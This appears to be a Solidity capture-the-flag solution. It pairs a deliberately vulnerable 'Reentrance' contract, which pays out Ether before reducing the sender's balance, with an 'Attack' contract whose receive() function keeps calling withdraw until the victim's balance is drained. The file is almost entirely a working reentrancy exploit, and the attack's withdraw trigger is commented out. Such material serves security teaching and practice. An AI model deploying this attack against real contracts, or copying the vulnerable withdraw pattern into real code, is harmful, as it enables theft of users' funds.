// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
//   using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to]+msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

//// Attacker contract///
contract Attack{
    Reentrance public attacker;
    uint _amount=0.001e18;
    constructor(Reentrance Add) public {
        attacker=Reentrance(Add);
    }
    function attack() external payable{
        attacker.donate{value:0.001 ether}(address(this));
        // attacker.withdraw(_amount);
    }

    receive()external payable{
        if(address(attacker).balance>0){
            attacker.withdraw(_amount);
        }
    }
}
